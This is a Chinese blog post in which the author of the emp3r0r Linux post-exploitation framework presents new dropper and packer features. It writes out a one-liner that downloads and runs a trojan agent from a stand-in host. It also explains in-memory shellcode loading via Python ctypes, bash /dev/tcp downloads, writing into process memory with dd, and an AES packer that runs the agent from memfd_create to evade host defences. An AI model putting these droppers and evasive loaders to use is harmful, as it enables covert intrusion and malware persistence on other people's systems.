# 介绍

本文是[emp3r0r：Linux用户打造的Linux后渗透框架](https://www.freebuf.com/sectool/259079.html)的后续。

首先感谢大家对[emp3r0r](https://github.com/jm33-m0/emp3r0r)的肯定，如果有什么想法可以在评论区交流。

最近添加了些我觉得可能有用的东西，今天要介绍的就是dropper和packer两个新功能。

dropper顾名思义是用来drop东西的，之所以会用到它，是因为我们一般倾向于分阶段（staged）的加载技术，为什么分阶段，因为你第一阶段可能处于一个比较受限的环境，不能直接把你的东西都甩上来。简单地理解，dropper可以是一段shell命令，用来drop我们的agent（也就是木马）ELF文件，比如脚本小子喜欢用的`wget
http://download.host.com/agent && chmod 755 agent && ./agent`。

我们不是脚本小子，所以我们更愿意用一些高级的dropper，比如大家都喜欢的内存加载，这也是本文所要介绍的主题之一。

至于说packer，你们一般叫它加壳。加壳的一个主要目的是避免被查杀，不过由于[emp3r0r](https://github.com/jm33-m0/emp3r0r)的自身设计，每个目标主机上运行的agent都是不同的文件（靠hash来查杀的懒人们可以歇歇了），一般是不太容易被常见的主机防护软件查杀了。不过为了高级些，也为了配合内存加载的需要，我还是搞了个加密的packer。

接下来进入正题。

## Dropper 与Shellcode

### 怎么生成

先说下为什么用shellcode。因为

> 1\. 这个东西可以注入到其它进程中；
>
> 2\. 理论上它可以没有任何依赖条件。

菜鸡如我从来没有写过shellcode，就先拿msfvenom介绍下吧：

![1610093533_5ff813dd8979c0b1ae910.png!small?1610093534212](https://image.3001.net/images/20210108/1610093533_5ff813dd8979c0b1ae910.png!small?1610093534212)

我们想要的是一个可以下载执行ELF文件的shellcode，很遗憾它没有。它甚至连一款实现了http通信的shellcode都没有，仅有的那个http的meterpreter
payload，并不是个shellcode（sorry）。

所以不会写shellcode又想演示一下的话，就用这个脱裤子放屁的`linux/x64/exec`吧。怎么用？你直接把它的exec命令设成`wget
http://download.host.com/agent && chmod 755 agent && ./agent`这样。

我们要生成一个字节串供之后emp3r0r使用：

![1610093543_5ff813e74272671c378b0.png!small?1610093543778](https://image.3001.net/images/20210108/1610093543_5ff813e74272671c378b0.png!small?1610093543778)

稍微解释下，`lwp-download`是`libwww-perl`的一部分，很多linux发行版默认会有这个包。`/dev/shm`是linux的shared
memory挂载点，放到这里就是放到了内存（虽然比较显眼）。

### 纯bash实现文件下载

现在的bash基本上都支持TCP pseudo device，我们完全可以在此基础上实现一个HTTP下载功能。

参考[shell tips](https://www.shell-tips.com/bash/download-files-from-shell/)的示例，我们可以把它做成一个subshell命令：![1610093551_5ff813ef9b14fad0ad8db.png!small?1610093552112](https://image.3001.net/images/20210108/1610093551_5ff813ef9b14fad0ad8db.png!small?1610093552112)

结合前面的，把它做成一个one liner:

![1610093558_5ff813f6cc6b8ed996157.png!small](https://image.3001.net/images/20210108/1610093558_5ff813f6cc6b8ed996157.png!small)

所以我们就可以把这个one liner作为msfvenom的命令参数来生成shellcode，这样可以兼容更多的目标主机。

当然，为了让shellcode更短，你完全可以minify一下上面的脚本，也可以删掉不必要的部分。

## Shellcode加载

### Python

你不能直接拿shell脚本去执行shellcode，对吧？

不对。

有一些几乎所有linux主机都会预装的工具程序，结合它们写个shell脚本，实现一个shellcode loader还是可行的。

比如python（我知道这不是bash，但你还得从bash或者别的什么shell来加载python吧？）

python实现这一点是通过[ctypes](https://docs.python.org/3/library/ctypes.html)。这是一个提供C调用接口的功能，让你可以在python中直接调用C的函数，所以我们可以利用这一点调用glibc的函数来加载shellcode。

根据[sektor7](https://blog.sektor7.net/#!res/2018/pure-in-memory-linux.md)的文章，思路大致是：

> 加载libc到当前python进程
>
> 使用`mmap`分配一块具有写入和执行权限的内存区域
>
> 把shellcode写进去
>
> cast我们的shellcode buffer类型，以便作为“函数”来调用：`(void *)shellcode`
>
> call我们的shellcode

代码如下：

![1610093596_5ff8141c4d70ba2b8e519.png!small?1610093596837](https://image.3001.net/images/20210108/1610093596_5ff8141c4d70ba2b8e519.png!small?1610093596837)

我把这个脚本集成到了[emp3r0r的dropper模块](https://github.com/jm33-m0/emp3r0r/wiki/Dropper)中，如果你需要加载自己的shellcode，请按照Wiki的说明操作。

最终会生成一个shell命令，直接在目标主机运行即可：

下图是全过程的示意：

![1610093854_5ff8151e5ded6f79c965f.png!small?1610093859524](https://image.3001.net/images/20210108/1610093854_5ff8151e5ded6f79c965f.png!small?1610093859524)

### dd

就不解释dd是干啥的了。

这里的思路是启动一个进程如sleep，然后用dd朝它的内存写入shellcode。

首先，在linux中，大部分情况下，我们可以修改子进程的内存（`/proc/pid/mem`）。我们的bash脚本会启动一个`sleep`进程，然后使用`dd`来替换当前bash，最后`dd`就成为了`sleep`的父进程。

然后，我们把shellcode写到`sleep`的text段某处，等待它被执行。

但我还没搞成功，下次再写篇文章吧。

# Packer加密与运行

这个packer完全使用[Go](https://golang.org)开发，改编自<https://github.com/guitmz/ezuri>。

思路是把agent的ELF文件进行AES加密，拼接到stub上，stub运行的时候，会定位原ELF的位置，将它解密。

解密之后用`memfd_create`给它找个匿名内存fd，写进去，并执行。

![1610093616_5ff814300e937f955c2eb.png!small?1610093616592](https://image.3001.net/images/20210108/1610093616_5ff814300e937f955c2eb.png!small?1610093616592)

## 从内存启动

自Linux 3.17之后，`memfd_create`可以返回一个匿名的内存区块，让用户可以像使用普通的`FILE
*`一样使用它。所以我们的packer首选这个启动方式。

![1610093622_5ff8143642010fe27dd2b.png!small?1610093622888](https://image.3001.net/images/20210108/1610093622_5ff8143642010fe27dd2b.png!small?1610093622888)

用Go一样可以调用syscall，而`memfd_create`只能通过syscall调用，没有暴露其它什么接口。

最后如果`memfd_create`失败，我们就退回简单的tmpfs方法，也就是`/dev/shm`。

# 更新计划

接下来会添加的几个功能：

> 从CC端到agent端的反向端口映射。这个功能可以让其它后渗透工具（如cobalt
> strike）的agent通过emp3r0r的通信隧道连接它们自己的CC服务
>
> 使用GDB对目标主机的进程注入shellcode，或者对自行启动的子进程注入（如果权限不足）。这个功能让你进一步运行cobalt
> strike或其它工具变得更加方便和隐蔽
>
> 用dd实现的一个dropper

# 鸣谢

> 文中提到的参考资料以及背后的大佬们
>
> 云舒大佬对上篇文章的转发
>
> 正在看这篇文章的你

